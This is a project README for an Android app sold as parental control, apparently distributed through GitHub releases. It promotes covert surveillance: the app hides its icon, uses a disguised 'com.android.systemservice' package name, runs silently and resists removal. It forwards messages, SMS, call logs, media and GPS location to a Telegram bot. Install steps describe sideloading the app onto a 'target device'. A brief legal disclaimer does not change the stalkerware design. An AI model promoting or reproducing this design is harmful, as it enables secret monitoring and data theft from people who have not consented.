# Parental Control Monitor 📱

> **Advanced Android Parental Control Application with Telegram Integration**

[![GitHub release](https://img.shields.io/github/release/yourusername/parental-control-monitor.svg)](https://github.com/yourusername/parental-control-monitor/releases)
[![License: MIT](https://img.shields.io/badge/License-MIT-yellow.svg)](https://opensource.org/licenses/MIT)
[![Android](https://img.shields.io/badge/Platform-Android-green.svg)](https://android.com)
[![API](https://img.shields.io/badge/API-27%2B-brightgreen.svg)](https://android-arsenal.com/api?level=27)
[![Build Status](https://github.com/yourusername/parental-control-monitor/workflows/CI/badge.svg)](https://github.com/yourusername/parental-control-monitor/actions)

A comprehensive, stealth Android parental control monitoring application designed specifically for **Huawei Nova 3i** devices. Features zero-configuration setup, complete invisibility, and real-time Telegram notifications.

## 🚀 Quick Start

**Want to download the APK immediately?**

[![Download Latest APK](https://img.shields.io/badge/Download-Latest%20APK-blue?style=for-the-badge&logo=android)](https://github.com/yourusername/parental-control-monitor/releases/latest)

1. **[Download APK](https://github.com/yourusername/parental-control-monitor/releases/latest)** → Install → Allow permissions → **Done!**
2. **Zero configuration required** - app auto-configures and hides itself
3. **Instant monitoring** via your pre-configured Telegram bot

## ✨ Key Features

### 🎯 **Zero-Configuration Setup**
- **Pre-built Telegram integration** - no tokens or IDs to configure
- **Automatic permission requests** - child just taps "Allow"
- **Self-hiding installation** - disappears immediately after setup
- **One-click monitoring** - starts automatically in background

### 🕵️ **Complete Stealth Operation**
- **Invisible launcher icon** - completely hidden from app drawer
- **Silent background operation** - no notifications or traces
- **Secret access methods** - `*#12345#` dialer code or URL scheme
- **Survives device restarts** - persistent background services

### 📱 **Comprehensive Monitoring**
- **Real-time notifications** - WhatsApp, Instagram, TikTok, Snapchat, etc.
- **Location tracking** - GPS coordinates with address resolution
- **Screen time analytics** - detailed app usage reports
- **Media monitoring** - photos, videos, downloads detection
- **Call & SMS logs** - complete communication history
- **App installation alerts** - security notifications

### 🛡️ **Huawei Nova 3i Optimized**
- **EMUI power management bypass** - prevents battery optimization
- **Protected apps integration** - ensures background persistence
- **Keep-alive mechanisms** - multiple restart strategies
- **Device-specific optimizations** - tailored for Nova 3i hardware

### 📲 **Telegram Integration**
- **Real-time bot notifications** - instant alerts and reports
- **Remote control commands** - `/status`, `/location`, `/hide`, `/show`
- **Rich message formatting** - detailed monitoring summaries
- **Offline storage & sync** - works without internet connection

## 📦 Installation Methods

### Method 1: Direct APK Download (Recommended)
```bash
1. Download latest APK from Releases
2. Transfer to target device (Google Drive, USB, etc.)
3. Install APK (enable unknown sources if needed)
4. Open app → Allow all permissions → Done!
```

### Method 2: Build from Source
```bash
git clone https://github.com/yourusername/parental-control-monitor.git
cd parental-control-monitor
./gradlew assembleRelease
```

### Method 3: GitHub Actions Auto-Build
```bash
1. Fork this repository
2. Configure your Telegram bot credentials
3. Push changes → Automatic APK build
4. Download from Actions artifacts
```

## 🔧 Configuration

### For Zero-Config APK (Recommended):
1. **Configure bot credentials** in `app/build_automated.gradle`:
   ```gradle
   buildConfigField "String", "TELEGRAM_BOT_TOKEN", "\"YOUR_BOT_TOKEN\""
   buildConfigField "String", "TELEGRAM_CHAT_ID", "\"YOUR_CHAT_ID\""
   ```
2. **Build APK** → **Distribute** → **Monitor immediately**

### For Manual Configuration:
- Access hidden app: `*#12345#` or `parentalcontrol://open`
- Configure Telegram bot credentials
- Enable monitoring services
- Activate stealth mode

## 📊 Monitoring Dashboard

### Real-Time Notifications Example:
```
📱 WhatsApp Notification
👤 Contact: Sarah Johnson
💬 Message: "Can you come to the party tonight?"
⏰ Time: 2025-08-13 19:45:23
📍 Location: School Area
🔋 Battery: 67%
```

### Location Tracking Example:
```
📍 Location Update
🏠 Address: 456 Oak Street, Springfield
🗺️ Coordinates: 39.7817, -89.6501
🎯 Accuracy: 8 meters
⏰ Time: 2025-08-13 20:15:30
🚶 Status: Walking (2.3 mph)
```

### Daily Usage Reports:
```
📊 Daily Screen Time - August 13, 2025
🎵 TikTok: 3h 15m (52%)
📸 Instagram: 1h 45m (28%)
💬 WhatsApp: 45m (12%)
👻 Snapchat: 30m (8%)
📱 Total: 6h 15m
```

## 🤖 Telegram Bot Commands

| Command | Description | Example Response |
|---------|-------------|------------------|
| `/status` | Service health check | Battery, connectivity, last sync |
| `/location` | Current GPS location | Coordinates with Google Maps link |
| `/apps` | Recent app usage | Screen time breakdown |
| `/photos` | Latest media files | Recent photos/videos list |
| `/calls` | Call history | Recent call logs with details |
| `/sms` | SMS history | Text message logs |
| `/hide` | Hide app icon | Confirmation message |
| `/show` | Show app icon | Confirmation message |
| `/start` | Start monitoring | All services activated |
| `/stop` | Pause monitoring | All services paused |

## 🏗️ Architecture

### Core Components
```
├── AutoSetupActivity          # Zero-config automated setup
├── MainActivity              # Hidden control panel
├── MonitoringService         # Main background service
├── TelegramService           # Bot communication
├── LocationService           # GPS tracking
├── NotificationListener      # System notifications
├── AccessibilityMonitor      # App usage tracking
├── HuaweiKeepAliveJob       # Device-specific persistence
└── PermissionHelper         # Automated permission handling
```

### Database Schema
```
├── notifications            # Captured app notifications
├── locations               # GPS coordinates & addresses
├── media_files            # Photos, videos, downloads
├── app_usage             # Screen time statistics
├── call_logs            # Phone call history
├── sms_logs            # Text message history
└── monitoring_config   # App settings & preferences
```

## 🛠️ Development

### Prerequisites
- **Android Studio** 2023.1.1+
- **Android SDK** API 27-34
- **JDK** 17+
- **Kotlin** 1.9.0+

### Build Configuration
```gradle
android {
    compileSdk 34
    defaultConfig {
        applicationId "com.android.systemservice"
        minSdk 27
        targetSdk 34
        versionCode 1
        versionName "1.0.0"
    }
}
```

### Dependencies
```gradle
dependencies {
    implementation 'androidx.room:room-runtime:2.6.1'
    implementation 'androidx.work:work-runtime-ktx:2.9.0'
    implementation 'com.squareup.retrofit2:retrofit:2.9.0'
    implementation 'com.google.android.gms:play-services-location:21.0.1'
    implementation 'androidx.lifecycle:lifecycle-service:2.7.0'
}
```

## 🚀 Deployment

### GitHub Actions Workflows
- **✅ Continuous Integration** - Build on every push
- **✅ Release Management** - Tagged releases with signed APKs
- **✅ Nightly Builds** - Daily development builds
- **✅ Manual Builds** - On-demand custom builds

### Distribution Methods
1. **GitHub Releases** - Stable, production-ready APKs
2. **Actions Artifacts** - Development builds (requires login)
3. **Google Drive** - Direct distribution to target devices

## 📱 Device Compatibility

### Primary Target
- **Huawei Nova 3i** (Android 8.1, EMUI 8.2) - **Fully Optimized**

### Supported Devices
- **Android 8.1+** (API 27+) - All major manufacturers
- **Huawei devices** - Enhanced EMUI optimizations
- **Samsung, Xiaomi, OnePlus** - Standard Android features

### Huawei-Specific Features
- ✅ **Battery optimization bypass**
- ✅ **Protected apps auto-configuration**
- ✅ **Auto-start management**
- ✅ **EMUI power management workarounds**

## 🔐 Security & Privacy

### Data Protection
- 🔒 **Local encryption** - AES-256 for all stored data
- 🔒 **Secure transmission** - HTTPS/TLS for API communication
- 🔒 **No cloud storage** - All data remains on device
- 🔒 **Auto-cleanup** - Configurable data retention policies

### Stealth Features
- 👻 **Complete invisibility** - Hidden from launcher and recent apps
- 👻 **Minimal footprint** - Optimized memory and battery usage
- 👻 **Silent operation** - No visible notifications or indicators
- 👻 **Tamper resistance** - Auto-restart and self-healing mechanisms

## ⚖️ Legal & Compliance

**⚠️ IMPORTANT LEGAL NOTICE**

This application is designed for **legitimate parental control purposes only**. Users must:

- ✅ Have **legal authority** over the monitored device
- ✅ **Comply with local privacy laws** and regulations
- ✅ Obtain **proper consent** where required by law
- ✅ Use **responsibly and ethically**

### Intended Use Cases
- ✅ **Parents monitoring minor children's devices**
- ✅ **Company-owned devices with employee consent**
- ✅ **Personal devices you own**

### Prohibited Uses
- ❌ Monitoring devices without legal authority
- ❌ Spying on adults without consent
- ❌ Commercial surveillance without disclosure
- ❌ Any illegal or unethical monitoring

## 📚 Documentation

- 📖 [**Installation Guide**](docs/INSTALLATION_GUIDE.md) - Complete setup instructions
- 🤖 [**Telegram Bot Setup**](docs/TELEGRAM_SETUP.md) - Bot configuration guide
- 🏗️ [**Build Instructions**](AUTOMATED_BUILD_GUIDE.md) - Development and deployment
- 🛡️ [**Huawei Optimization**](HUAWEI_NOVA_3I_SETUP.md) - Device-specific setup
- 🔧 [**GitHub Actions Guide**](GITHUB_ACTIONS_GUIDE.md) - CI/CD pipeline
- 🐛 [**Troubleshooting**](docs/TROUBLESHOOTING.md) - Common issues and solutions

## 🤝 Contributing

We welcome contributions! Please see our [Contributing Guidelines](CONTRIBUTING.md).

### Development Process
1. **Fork** the repository
2. **Create** a feature branch (`git checkout -b feature/amazing-feature`)
3. **Commit** your changes (`git commit -m 'Add amazing feature'`)
4. **Push** to the branch (`git push origin feature/amazing-feature`)
5. **Open** a Pull Request

### Code Standards
- ✅ Follow **Kotlin coding conventions**
- ✅ Add **comprehensive documentation**
- ✅ Include **appropriate error handling**
- ✅ Test on **target devices**
- ✅ Maintain **privacy and security standards**

## 📈 Project Stats

![GitHub stars](https://img.shields.io/github/stars/yourusername/parental-control-monitor?style=social)
![GitHub forks](https://img.shields.io/github/forks/yourusername/parental-control-monitor?style=social)
![GitHub issues](https://img.shields.io/github/issues/yourusername/parental-control-monitor)
![GitHub pull requests](https://img.shields.io/github/issues-pr/yourusername/parental-control-monitor)

## 🏷️ Version History

See [Releases](https://github.com/yourusername/parental-control-monitor/releases) for detailed version history and changelogs.

### Latest Release - v1.0.0
- ✅ Zero-configuration automated setup
- ✅ Complete stealth operation
- ✅ Huawei Nova 3i optimizations
- ✅ Real-time Telegram integration
- ✅ Comprehensive monitoring capabilities

## 📞 Support

### Getting Help
- 🐛 [**Report Bugs**](https://github.com/yourusername/parental-control-monitor/issues/new?template=bug_report.yml)
- 💡 [**Request Features**](https://github.com/yourusername/parental-control-monitor/issues/new?template=feature_request.yml)
- 💬 [**Discussions**](https://github.com/yourusername/parental-control-monitor/discussions)
- 📧 [**Email Support**](mailto:support@example.com)

### Community
- 🌟 **Star this repo** if you find it useful
- 🔄 **Share with others** who might benefit
- 🐦 **Follow updates** on social media
- 💬 **Join discussions** for tips and tricks

## 📄 License

This project is licensed under the **MIT License** - see the [LICENSE](LICENSE) file for details.

```
MIT License

Copyright (c) 2025 Parental Control Monitor

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.
```

## 🙏 Acknowledgments

- **Android Development Team** - For the robust Android platform
- **Telegram Bot API** - For secure communication infrastructure
- **Huawei EMUI Team** - For device optimization insights
- **Open Source Community** - For inspiration and best practices

## ⭐ Star History

[![Star History Chart](https://api.star-history.com/svg?repos=yourusername/parental-control-monitor&type=Date)](https://star-history.com/#yourusername/parental-control-monitor&Date)

---

<div align="center">

**Made with ❤️ for responsible parental monitoring**

[📱 Download APK](https://github.com/yourusername/parental-control-monitor/releases/latest) • 
[📖 Documentation](docs/) • 
[🐛 Report Bug](https://github.com/yourusername/parental-control-monitor/issues) • 
[💡 Request Feature](https://github.com/yourusername/parental-control-monitor/issues)

</div>
#   T r i g g e r   b u i l d  
 